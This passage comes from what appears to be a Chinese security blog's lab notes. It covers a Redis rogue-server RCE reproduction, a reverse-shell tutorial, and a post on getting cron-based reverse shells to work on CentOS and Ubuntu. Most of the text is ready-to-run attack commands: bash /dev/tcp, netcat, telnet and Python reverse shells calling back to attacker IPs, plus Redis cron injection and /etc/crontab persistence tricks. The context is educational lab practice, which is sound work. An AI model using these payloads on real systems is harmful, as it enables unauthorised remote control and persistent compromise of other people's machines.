href="https://github.com/n0b0dyCN/redis-rogue-server%E4%B8%8B%E8%BD%BD%E5%B9%B6%E6%94%BE%E5%88%B0%E5%92%8Credis-rce.py%E5%90%8C%E4%B8%80%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%EF%BC%9A">https://github.com/n0b0dyCN/redis-rogue-server下载并放到和redis-rce.py同一目录下，然后执行如下命令：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 192.168.144.128 -L 192.168.144.130 -f exp.so</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230612171921307.png"></p><p>复现成功</p><p>复现的时候遇到问题redis的6379端口一直被占用，用kill -9命令删除后又会新开启一个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis            //查找正在运行的redis进程</span><br></pre></td></tr></table></figure><p>解决方法是直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/redis-server stop  //停止redis服务</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2024/01/22/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>反弹shell</strong>：控制端监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端</p><p><strong>正向getshell</strong>: 控制端(也就是我们自己的机器)发送请求去连接被控端(目标机器)的方式。<br>不过这种方式会受到防火墙,路由,等各种很多因素影响,很难成功。</p><p><img src="http://pic.bamboo22.top/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMw,size_16,color_FFFFFF,t_70.png"></p><p><strong>反弹shell</strong>: 被控端主动发送请求连接我们的控制端。<br>这种方法是可以想办法避开防火墙和路由的一些限制的!</p><p><img src="http://pic.bamboo22.top/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMw,size_16,color_FFFFFF,t_70-16861419258613.png"></p><p><strong>为什么需要反弹shell？</strong></p><p>当正向连接不可达时候</p><ul><li>客户机中了木马，但是在局域网内，无法正向连接。</li><li>由于防火墙和局域网的限制，对方只能发送请求，不可主动接受请求</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="bash反弹："><a href="#bash反弹：" class="headerlink" title="bash反弹："></a>bash反弹：</h4><p>这是最常见也是最简单的一种反弹shell的方式，直接看命令：</p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 1231</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.144.128/1231 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607190252137.png"></p><p><img src="http://pic.bamboo22.top/image-20230607192139651.png"></p><p><img src="http://pic.bamboo22.top/image-20230607192057903.png"></p><p>实现命令执行</p><p><img src="http://pic.bamboo22.top/image-20230607204242802.png"></p><h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><h5 id="e被阉割的情况："><a href="#e被阉割的情况：" class="headerlink" title="e被阉割的情况："></a>e被阉割的情况：</h5><p>先说一下不用nc -e 这个选项的时候，我们应该怎么做：</p><p>攻击机器开启两个端口的监听：（为什么要开两个，这个下面会讲）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666 </span><br><span class="line">nc -lvp 7777 </span><br></pre></td></tr></table></figure><p>受害机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.144.128 6666|/bin/bash|nc 192.168.144.128 7777</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://pic.bamboo22.top/image-20230607204210160.png"></p><p><img src="http://pic.bamboo22.top/image-20230607194016234.png"></p><p>首先我们连接到6666端口进行通信，然后把通信的内容作为输入放到&#x2F;bin&#x2F;bash解释器里面去，再把解释器运行出来的内容作为输入通信到7777端口，于是就有了上述的画面。</p><p>注意：这里报错信息不会回显在攻击机上，但是可以看到被攻击机执行了命令，并在本机上显示</p><h5 id="nc-e"><a href="#nc-e" class="headerlink" title="nc-e"></a>nc-e</h5><p>目前大部分linux版本都阉割了-e选项，因为实在是有点危险<br>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、下载安装</span><br><span class="line">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class="line">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line">cd /usr/local/netcat</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">2、配置</span><br><span class="line">vim /etc/profile</span><br><span class="line">添加以下内容：</span><br><span class="line"># set  netcat path</span><br><span class="line">export NETCAT_HOME=/usr/local/netcat</span><br><span class="line">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class="line">保存，退出，并使配置生效：</span><br><span class="line">source /etc/profile</span><br><span class="line">3、测试</span><br><span class="line">nc -help成功</span><br></pre></td></tr></table></figure><p>接下来直接展示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">受害机：nc -e /bin/bash 192.168.28.128 7777   或者： netcat 192.168.28.128 7777 -e /bin/bash</span><br><span class="line">攻击机：nc -lvp 7777</span><br></pre></td></tr></table></figure><p>关于nc -e选项的解释：<br>主要关键词：连接 、重定向、执行<br>连接就执行并且重定向结果到连接机器的端口</p><p>这个在安装那步报错了，还没试验成功</p><h4 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h4><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><p>这里Telnet主要是起到一个连接的作用（删除管道通过rm -f xx 即可）</p><p>攻击机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 192.168.144.128 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607200737619.png"></p><p><img src="http://pic.bamboo22.top/image-20230607200750970.png"></p><p>攻击机上的playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p>mknod：创建一个管道，telnet 连接通信并且把输入重定向到管道a中去，1&gt;a，把输出重定向到管道a中去<br>如果说这个管道符号不好理解的话，那就看看下面这个</p><h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><p>这个方法和上面nc -e 被阉割的方法一样，都是开启两个监听，然后通过不断的重定向符号反弹shell</p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666  nc -lvp 7777</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.144.128 6666 | /bin/bash | telnet 192.168.144.128 7777</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607201410059.png"></p><h4 id="python脚本弹shell"><a href="#python脚本弹shell" class="headerlink" title="python脚本弹shell"></a>python脚本弹shell</h4><p>攻击机： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.144.128&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607202343268.png"></p><p><img src="http://pic.bamboo22.top/image-20230607204140241.png"></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解决Ubuntu计划任务弹shell失败</title>
      <link href="/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="解决Ubuntu计划任务弹shell失败"><a href="#解决Ubuntu计划任务弹shell失败" class="headerlink" title="解决Ubuntu计划任务弹shell失败"></a>解决Ubuntu计划任务弹shell失败</h1><p>在复现redis时几种情况都复现成功了，只有计划任务弹shell没有成功，今天就来探究一下</p><p>当时的情况是：</p><p>已经成功写入反弹信息，但是还是无法反弹shell，</p><p>当时推测应该是利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。试了很多次都没有执行成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.144.130/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609220933226.png"></p><p><img src="http://pic.bamboo22.top/image-20230609220828144.png"></p><h2 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h2><ul><li><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>为什么在ubuntu默认终端上反弹shell没有用？而在centos上就行？</li><li>ubuntu为什么将上述命令写入脚本运行在上就可以反弹？</li><li>centos与ubuntu的计划任务有何不同？</li><li>&#x2F;etc&#x2F;cron与&#x2F;var&#x2F;spool&#x2F;cron有什么区别？</li><li>sh、dash、bash有啥区别？</li></ul><h2 id="一些基础"><a href="#一些基础" class="headerlink" title="一些基础"></a>一些基础</h2><h3 id="常用命令以及参数"><a href="#常用命令以及参数" class="headerlink" title="常用命令以及参数"></a>常用命令以及参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e#编辑计划任务</span><br><span class="line">crontab -l #列出计划任务</span><br><span class="line">crontab -r#删除计划任务</span><br></pre></td></tr></table></figure><h3 id="相关目录"><a href="#相关目录" class="headerlink" title="相关目录"></a>相关目录</h3><p>centos计划任务目录：<code>/var/spool/cron/</code></p><p>ubuntu计划任务目录：<code>/var/spool/cron/crontabs/</code></p><p>计划任务日志(系统日志)：<code>/var/log/syslog</code></p><p>具体的举例用法可以参考菜鸟教程：<a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></p><h3 id="etc-crontab-和-var-spool-cron区别"><a href="#etc-crontab-和-var-spool-cron区别" class="headerlink" title="&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别"></a>&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别</h3><p><code>/etc/crontab</code>（系统级的）系统执行计划</p><p><code>/var/spool/cron/</code>（用户级的）这个目录是以账号来区分每个用户自己的执行计划</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m:分钟 - 从0到59的整数</span><br><span class="line">h:小时 - 从0到23的整数</span><br><span class="line">dom:天 - 从1到31的整数 (必须是指定月份的有效日期)</span><br><span class="line">mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)</span><br><span class="line">dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)</span><br><span class="line">user:指的是执行命令的用户</span><br><span class="line">command: 需要执行的命令</span><br><span class="line">星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次</span><br><span class="line">符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</span><br></pre></td></tr></table></figure><h2 id="CentOS计划任务弹shell"><a href="#CentOS计划任务弹shell" class="headerlink" title="CentOS计划任务弹shell"></a>CentOS计划任务弹shell</h2><p>既然说CentOS计划任务是可以成功的，那我们就先来在CentOS上试一试</p><h3 id="法一：crontab-e写入命令"><a href="#法一：crontab-e写入命令" class="headerlink" title="法一：crontab -e写入命令"></a>法一：crontab -e写入命令</h3><p>centos机器上，输入<code>crontab -e</code>就会出现一个文件，可以看到这是一个临时的缓存文件，写入下方命令并保存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -e  写入：</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br><span class="line">或者</span><br><span class="line">*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624210727691.png"></p><p>这时候使用<code>crontab -l</code>命令，就可以看到我们定的计划任务了。</p><p><img src="http://pic.bamboo22.top/image-20230624210656113.png"></p><p>同时可以看到在<code>/var/spool/cron</code>目录下多了一个文件为<code>root</code>，里面的内容就是刚才写入的bash反弹命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /var/spool/cron</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230630100804098.png"></p><p>一分钟左右就会弹回来</p><p><img src="http://pic.bamboo22.top/image-20230624211005391.png"></p><h3 id="法二：echo写入文件"><a href="#法二：echo写入文件" class="headerlink" title="法二：echo写入文件"></a>法二：echo写入文件</h3><p>上面的<code>crontab -e</code>方式其实就是帮我们在<code>/var/spool/cron</code>目录下创建了一个<code>root</code>文件而已；所以可以尝试直接使用<code>echo</code>命令来写入<code>bash</code>反弹命令到这个文件中，即下方命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br><span class="line">或者</span><br><span class="line">echo &#x27;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure><p>先使用<code>crontab -r</code>删除计划任务，随后输入上方命令<code>echo</code>写入计划任务成功反弹。</p><p><img src="http://pic.bamboo22.top/image-20230624212032751.png"></p><p>这里注意：**<code>/var/spool/cron/</code> 目录下存放的是每个用户包括<code>root</code>的<code>crontab</code>任务，每个任务以创建者的名字命名。**</p><h3 id="法三：crontab-e写入文件"><a href="#法三：crontab-e写入文件" class="headerlink" title="法三：crontab -e写入文件"></a>法三：crontab -e写入文件</h3><p>我们知道<code>bash</code>反弹<code>shell</code>除了直接输入命令，还可以将命令写入<code>sh</code>文件，然后<code>bash</code>运行。那么我新建一个<code>/tmp/1.sh</code>写入<code>bash</code>反弹命令，然后再向计划任务中写入这个文件，也是可以成功弹回的。</p><p>CentOS:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron</span><br><span class="line">vim /tmp/1.sh</span><br><span class="line">输入反弹命令</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br><span class="line">echo &#x27;*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624213018646.png"></p><p><img src="http://pic.bamboo22.top/image-20230624212839070.png"></p><p>同样反弹成功</p><p><strong>注意：写入的文件最好统一为绝对路径，不建议相对路径。</strong></p><h3 id="法四：echo写入命令和文件到-etc-crontab"><a href="#法四：echo写入命令和文件到-etc-crontab" class="headerlink" title="法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab"></a>法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab</h3><p>在<code>/etc/crontab</code>这个文件中，已经有了官方的介绍</p><p><img src="http://pic.bamboo22.top/image-20230624213327531.png"></p><p>可以看到命令里面必须要添加用户名，才能反弹成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * root bash -i &gt;&amp; /dev/tcp/192.168.144.128/1111 0&gt;&amp;1&#x27; &gt; /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624214417091.png"></p><h2 id="Ubuntu计划任务反弹shell"><a href="#Ubuntu计划任务反弹shell" class="headerlink" title="Ubuntu计划任务反弹shell"></a>Ubuntu计划任务反弹shell</h2><p>Ubuntu和kali都是基于dibian，我们之前已经知道了不能用CentOS的方法，下面就探究一下Ubuntu上应该如何操作</p><h3 id="法一：crontab-e写入命令-1"><a href="#法一：crontab-e写入命令-1" class="headerlink" title="法一：crontab -e写入命令"></a>法一：crontab -e写入命令</h3><p><code>crontab -e</code>时提示选择编辑器，然后写入之前的计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.144.128/1111 0&gt;&amp;1:</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627202629918.png"></p><p>当然是没有反弹成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -15 /var/log/syslog</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(CRON) info (No MTA installed, discarding output)</span><br><span class="line">#(计划任务)信息(没有邮件系统，放弃输出)</span><br></pre></td></tr></table></figure><p>Ubuntu系统默认会将计划任务的错误信息以邮件的方式发送给用户，但是由于Ubuntu系统默认没有安装邮件系统，所以真正的报错信息被<code>discarding output</code>(被舍弃)了，而不是<code>No MTA installed，discarding output</code>这句话。</p><p><strong>寻找真正的错误信息:</strong></p><p>想看到真正的报错信息有两种解决办法：</p><p>1.安装邮件系统，这个方法就算了，没必要。</p><p>2.将计划任务的错误信息输出到一个文件内，那么需要我们修改一下计划任务如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * bash -i  &#x27;&gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27;&gt;/tmp/error.txt 2&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627201537183.png"></p><p>真正的报错信息了：**&#x2F;bin&#x2F;bash没有找到**</p><p>我们去<code>/etc/crontab</code>里面看一下，发现没有bash，只有一个&#x2F;bin&#x2F;sh,换句话说<code>ubuntu</code>的<code>cron</code>中命令执行的shell环境是<code>/bin/sh</code>。</p><p><img src="http://pic.bamboo22.top/image-20230627204204257.png"></p><h4 id="sh与dash"><a href="#sh与dash" class="headerlink" title="sh与dash"></a>sh与dash</h4><p>那么这里来找一下到底<code>/bin/sh</code>是什么，如下图可以看出，<code>sh</code>其实是指向<code>dash</code>的一个软连接。而dash是什么呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /bin/ | grep -w &quot;sh&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627204122881.png"></p><p>综合网上查询的信息得出个结论：Debian和Ubuntu中，&#x2F;bin&#x2F;sh默认已经指向dash，dash比bash体积小速度快，兼容性高。<strong>dash主要是为了执行脚本而出现，所以不能实现交互</strong>，功能相比bash要少很多，语法严格遵守POSIX标准。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>在ubuntu系统上执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>无法直接反弹shell是因为ubuntu系统打开的终端默认是<code>sh</code>运行的命令，而sh刚才也提到了，实际上就是dash。dash只能够进行脚本的运行，而<code>bash -i</code>这个命令，使用到了bash交互的功能，所以sh不能在实现交互，也就反弹失败了。</p><p><img src="http://pic.bamboo22.top/image-20230627204448457.png"></p><p>如果我在ubuntu默认的终端中输入<code>bash</code>就会切换到<code>bash</code>终端，进而就可以使用<code>bash -i</code>了</p><p>又或者我是用<code>bash -c</code>，没有用到<code>bash</code>交互功能，也可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627205517640.png"></p><p>这样就能连接成功了</p><p>回到刚刚那儿，写入的内容，不能是bash -i开头的bash反弹，而应该是bash -c即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * bash -c &quot;bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627205118643.png"></p><p>成功</p><h3 id="法二：echo写入文件-1"><a href="#法二：echo写入文件-1" class="headerlink" title="法二：echo写入文件"></a>法二：echo写入文件</h3><p>下面这种按理也能弹shell，但是尝试后发现失败，这也是坑点之一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /tmp/1.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.144.130/1111 0&gt;&amp;1</span><br><span class="line">echo &quot;*/1 * * * * bash /tmp/1.sh&quot; &gt;&gt; /var/spool/cron/crontabs/root #ubuntu的计划任务路径目录为/var/spool/cron/crontabs/</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627210606653.png"></p><p><strong>因为我们echo创建的root文件，默认权限是644，ubuntu这里规定，计划任务root文件的权限必须是600！</strong></p><p>修改权限的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 root        修改权限为600</span><br><span class="line">systemctl restart cron      再重启</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230628111835358.png"></p><p>修改之后瞬间成功</p><p><img src="http://pic.bamboo22.top/image-20230628111813314.png"></p><h3 id="法三：crontab-e写入文件-1"><a href="#法三：crontab-e写入文件-1" class="headerlink" title="法三：crontab -e写入文件"></a>法三：crontab -e写入文件</h3><blockquote><p><strong>通过命令crontab -e来创建的计划任务生成的root文件，默认就是600权限！</strong></p></blockquote><p>所以不需要修改，和之前的操作差不多，就不赘述了</p><h3 id="法四：echo写入命令和文件到-etc-crontab-1"><a href="#法四：echo写入命令和文件到-etc-crontab-1" class="headerlink" title="法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab"></a>法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab</h3><p>直接<strong>贴上总结和优化后的代码</strong>，在渗透的时候，请先备份一下<code>/etc/crontab</code>文件，然后再添加命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#新建一个.sh文件并加执行权限</span><br><span class="line">touch /tmp/test.sh</span><br><span class="line">chmod +x /tmp/test.sh</span><br><span class="line"> </span><br><span class="line">vim /etc/crontab </span><br><span class="line">#写一个sh脚本</span><br><span class="line">echo &quot;#\!/bin/bash&quot; &gt;&gt; /tmp/test.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.144.130/1111 0&gt;&amp;1&quot; &gt;&gt; /tmp/test.sh</span><br><span class="line"> </span><br><span class="line">#sed命令必须是单引号,-i就是修改;$在正则中表示最后一行,a表示在指定行下边插入指定的内容行,$a就是在最后一行插入。</span><br><span class="line">sed -i &#x27;$a*/1 * * * * root bash /tmp/test.sh&#x27; /etc/crontab</span><br><span class="line"> </span><br><span class="line">#d表示删除，$d即删除最后一行，也就是刚刚添加的命令</span><br><span class="line">sed -i &#x27;$d&#x27; /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627211432881.png"></p><p><img src="http://pic.bamboo22.top/image-20230627211416034.png"></p><h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><ol><li><p><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>为什么在ubuntu默认终端上反弹shell没有用？而在centos上就行？</p></li><li><p>为什么在ubuntu系统上把上述命令写入脚本运行就可以反弹shell了？</p><p>问题1、2答：<code>ubuntu</code>终端默认启用<code>sh</code>，而<code>sh</code>指向的是<code>dash 